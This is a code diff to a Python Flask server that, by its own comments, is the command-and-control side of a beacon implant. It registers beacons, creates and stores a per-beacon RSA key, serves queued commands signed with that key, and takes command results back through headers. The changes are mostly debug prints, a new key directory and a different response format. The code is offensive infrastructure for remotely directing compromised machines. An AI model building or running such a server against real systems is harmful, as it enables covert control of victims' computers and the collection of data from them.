@@ -28,6 +28,7 @@ app = Flask(__name__)
 
 @app.route('/', methods=['GET'])
 def home():
+    print('start')
     # This handles initial registration
     # The beacon receives the initial reg and adds it to the db
     if request.method == 'GET':
@@ -43,6 +44,7 @@ def home():
                 public_exponent=65537,
                 key_size=2048,
             )
+            print('made key')
             pem_public_key = private_key.public_key().public_bytes(
                 encoding=serialization.Encoding.PEM,
                 format=serialization.PublicFormat.SubjectPublicKeyInfo
@@ -52,8 +54,8 @@ def home():
                 format=serialization.PrivateFormat.TraditionalOpenSSL,
                 encryption_algorithm=serialization.NoEncryption()
             )
-            print(type(pem))
-            with open(uuid+".pem", "wb") as key_file: # Write the key value to the pem
+            print('test')
+            with open('keys/'+uuid+".pem", "wb") as key_file: # Write the key value to the pem
                 key_file.write(pem)
             structure = {
                 "WhoAmI": f"{whoami}",
@@ -73,6 +75,7 @@ def home():
 
 @app.route('/session', methods=['GET'])
 def session():
+    print('session')
     # This function handles the beacon requesting a command
     if request.method == 'GET':
         uuid = request.headers['APPSESSIONID']
@@ -81,19 +84,22 @@ def session():
             # If we receive special characters just drop it entirely
             pass
         else:
-            command = conn.hget('UUID', uuid)  # Get the struct
-            command = command.decode()  # Decode it from bytes
-            command = json.loads(command)  # it's returned as string so convert it to dict
-            structure = json.dumps(command)  # Dump the dict to json
+            connt = conn.hget('UUID', uuid)  # Get the struct
+            connt = connt.decode()  # Decode it from bytes
+            connt = json.loads(connt)  # it's returned as string so convert it to dict
+            structure = json.dumps(connt)  # Dump the dict to json
             connector = json.loads(structure)  # Load it into a new var
             command = connector["Command"]  # Grab the command var from the object
             LastInteraction = connector["LastInteraction"]
             result = connector["Result"]
             whoami = connector["WhoAmI"]
-            command = bytes(command, 'utf-8') # To sign the command, it requires a bytes like object
-            with open(uuid + ".pem", "rb") as key_file: # Read in the pem file for the UUID
+
+            command1 = bytes(command, 'utf-8') # To sign the command, it requires a bytes like object
+
+            with open('keys/'+uuid + ".pem", "rb") as key_file: # Read in the pem file for the UUID
                 private_key = serialization.load_pem_private_key(key_file.read(), password=None)
-            signature = private_key.sign(command, padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
+
+            signature = private_key.sign(command1, padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
                                                               salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())
             signature = binascii.b2a_hex(signature).decode()
             # Set the command to 0
@@ -110,14 +116,9 @@ def session():
             structure = json.dumps(structure)  # Dump the json
             # Write the message value to the beacon:UUID key
             conn.hset('UUID', uuid, structure)
-            command = str(command) # We have to convert this back to str from bytes to concat together
-            command = command.replace("b",'') # Strip the bytes identifier
-            command = command.replace("'",'')
-            print(type(command),command)
-            print(type(signature))
-            combined = command + ' ' + signature
-            print(combined)
-            resp = Response(command)
+            signature = str(signature)
+            resp = Response(
+                response=command, status=302, mimetype="text/plain")
             resp.headers['Verifier'] = signature
             return resp  # we've really got to RC4 encrypt this
 
@@ -126,6 +127,7 @@ def session():
 def schema():
     # This function handles beacons returning data
     # Grab the appsessionid value from the headers
+    # We need to grab the corresponding private key from the key store to decrypt incoming messages with
     # Set a default value on checkin to create the hostname/whoami to identify the beacon [needs testing]
     uuid = request.headers['APPSESSIONID']
     result = request.headers['Res']
